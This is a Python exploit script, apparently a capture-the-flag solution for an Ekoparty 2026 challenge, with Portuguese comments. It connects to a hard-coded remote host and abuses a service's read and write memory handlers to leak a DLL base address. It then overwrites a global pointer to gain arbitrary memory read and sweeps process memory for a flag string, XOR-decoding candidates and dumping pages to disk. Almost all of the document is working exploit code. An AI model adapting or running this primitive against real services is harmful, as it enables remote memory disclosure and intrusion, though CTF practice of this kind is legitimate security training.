#!/usr/bin/env python3
# PRIMITIVO LIMPO (sem shellcode, NAO crasha). Confirmado por disassembly dos handlers:
#   flag=1: ReadProcessMemory(*(DLL+0xe360)+counter, body, length)   length<=0x1000
#   flag=2: WriteProcessMemory(*(DLL+0xe360)+counter, body, length)  length<=0x1000
#   *(DLL+0xe360) = base da DLL (gravavel, lida fresca a cada chamada).
# Tecnica: flag=2 grava um VALOR arbitrario V em [0xe360] (counter=0xe360, body=pack(V)) ->
#          flag=1 counter=A-V le o endereco absoluto A  (A em [V, V+4GB), pois counter e u32).
# Janela 1 (V=0): cobre memoria baixa -> HEAPS/arena (onde uma flag gerada em runtime costuma ficar).
# Para outra faixa: V=0x140000000 python3 scan_base.py   (EXE preferido)  / V=<hex> p/ base ASLR.
# NAO usa flag=0 -> nao dispara o shellcode one-shot -> processo sobrevive -> varre a vontade.
import socket, struct, re, os, time
HOST, PORT = "63.183.92.113", 20269
COOKIE  = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
E360    = 0xe360
D       = os.path.dirname(os.path.abspath(__file__))
FORCE   = os.environ.get("FORCE") == "1"
V       = int(os.environ.get("V","0"), 0)           # base a apontar nesta janela
LO      = int(os.environ.get("LO","0x300000"), 0)   # inicio do sweep (abs)
HI      = int(os.environ.get("HI","0x1800000"), 0)  # fim do sweep (abs)
u64 = lambda b,o=0: struct.unpack("<Q", b[o:o+8])[0]

REAL = re.compile(rb'HIK_[A-Za-z0-9_]{2,60}_[0-9a-f]{32}')
LOOSE= re.compile(rb'HIK_[\x20-\x7e]{4,120}')
XKEY = bytes.fromhex("9c25a203")
def detect(r):
    for pat in (REAL, LOOSE):
        m=pat.search(r)
        if m: return m.group().decode(errors='replace')
    w=r.replace(b"\x00",b"")
    for pat in (REAL, LOOSE):
        m=pat.search(w)
        if m: return m.group().decode(errors='replace')+"  [UTF16]"
    dec=bytes(r[i]^XKEY[i%4] for i in range(len(r)))
    m=REAL.search(dec)
    if m: return m.group().decode()+"  [XOR4 9c25a203]"
    for i in range(len(r)-4):
        k=bytes(r[i+j]^b"HIK_"[j] for j in range(4))
        if k==b"\x00\x00\x00\x00": continue
        end=min(i+100,len(r)); seg=bytes(r[i+j]^k[j%4] for j in range(end-i))
        m=REAL.match(seg)
        if m: return m.group().decode()+f"  [XOR4 {k.hex()} @+0x{i:x}]"
    return None

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout, ConnectionResetError, OSError): pass
    return b
def req(s,flag,counter,length,body=b""):
    s.sendall(struct.pack("<IBII",13+len(body),flag,counter&0xffffffff,length)+body); return rd(s,length)

def connect(tries=400,wait=6):
    t0=time.time()
    for i in range(tries):
        try:
            s=socket.create_connection((HOST,PORT),timeout=6); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        except Exception as e:
            print(f"[{int(time.time()-t0)}s] connect fail: {e}"); time.sleep(wait); continue
        s.sendall(COOKIE); b=rd(s,20,to=4.0)
        if b==HEALTHY: print(f"[+] JANELA LIMPA (tent {i+1}, {int(time.time()-t0)}s)"); return s
        if FORCE: print("[~] degradado mas FORCE=1"); return s
        if i%10==0: print(f"[{int(time.time()-t0)}s] degradado (tent {i+1}), cacando restart a cada {wait}s...")
        s.close()
        if i<tries-1: time.sleep(wait)
    return None

def readmem(s, base_v, addr, length=0x1000):
    counter=addr-base_v
    if not (0<=counter<=0xffffffff): return None          # fora do alcance u32
    body=b"\x00"*(length+0x200)                           # folga (handler escreve length em body+0xd)
    return req(s,1,counter,length,body)

def set_base(s, cur_v, newv):
    counter=(cur_v+E360)-cur_v  # = E360 quando cur_v e a base; dest = cur_v+counter = base+0xe360 (o proprio [0xe360])
    # dest precisa ser (base_atual_do_processo)+0xe360. como cur_v E essa base, counter=0xe360.
    body=struct.pack("<Q",newv).ljust(8+0x200,b"\x00")
    return req(s,2,0xe360,8,body)

def main():
    s=connect()
    if not s: print("sem janela; aguardar restart."); return
    # 1) vaza a base atual B = *(0xe360): com base=B, counter=0xe360 le B+0xe360 = [0xe360] = B.
    rb=req(s,1,0xe360,8,b"\x00"*0x210)
    if len(rb)<8: print(f"leak base falhou ({len(rb)}B); handler morto. abortar."); s.close(); return
    B=u64(rb)
    print(f"[leak] *(0xe360) = 0x{B:x}")
    if not (0x7ff000000000<=B<0x800000000000):
        print("  !! base nao parece DLL (0x7ff...). [0xe360] ja foi adulterada por run anterior;")
        print("     precisa de um processo fresco (restart 10min). abortar."); s.close(); return

    # 2) aponta a base p/ V
    pr=set_base(s,B,V)
    print(f"[set] base <- 0x{V:x} (resp {len(pr)}B)")
    # confirma: agora counter=(B+0xe360)-V deveria reler a propria global e dar V
    chk=readmem(s,V,B+0xe360,8)
    if chk and len(chk)>=8:
        print(f"[chk] *(0xe360) agora = 0x{u64(chk):x} (esperado 0x{V:x})")

    # 3) sweep absoluto [LO,HI) via flag=1 (counter=addr-V). NAO crasha.
    print(f"\n== sweep [0x{LO:x}..0x{HI:x}) com base V=0x{V:x} ==")
    DUMP=bytearray(); found=[]; nread=0; nhit=0
    t0=time.time()
    addr=LO
    while addr<HI:
        r=readmem(s,V,addr,0x1000)
        if r is None: print(f"  0x{addr:x}: fora do alcance u32 (addr-V>4GB), parando"); break
        if len(r)==0:
            # conexao caiu -> reconecta (base persiste em [0xe360])
            print(f"  0x{addr:x}: conexao caiu, reconectando...")
            try:s.close()
            except:pass
            s=connect(tries=40,wait=6)
            if not s: print("  nao reconectou (janela acabou)."); break
            continue
        nread+=1
        if sum(r):
            nhit+=1; DUMP.extend(struct.pack("<Q",addr)+r)
            fl=detect(r)
            if fl:
                print(f"  >>> FLAG @0x{addr:x}: {fl}"); found.append(fl); break
            if nhit<=60 or nhit%50==0:
                asc=''.join(chr(x) if 32<=x<127 else '.' for x in r[:28])
                print(f"  0x{addr:x}: {r[:12].hex()} | {asc}")
        addr+=0x1000
    dt=time.time()-t0
    try:s and s.close()
    except:pass
    open(os.path.join(D,"scan_base_dump.bin"),"wb").write(DUMP)
    print(f"\n[+] {nread} paginas lidas, {nhit} com dados, {dt:.0f}s. dump: scan_base_dump.bin ({len(DUMP)}B)")
    print("== RESUMO ==")
    if found:
        for f in set(found): print("FLAG2 CANDIDATA:", f)
    else:
        print(f"nada em [0x{LO:x},0x{HI:x}) base=0x{V:x}.")
        print("proximo: V=0x100000000 (p/ 0x140000000), ou brute XOR offline no scan_base_dump.bin")

if __name__=="__main__": main()
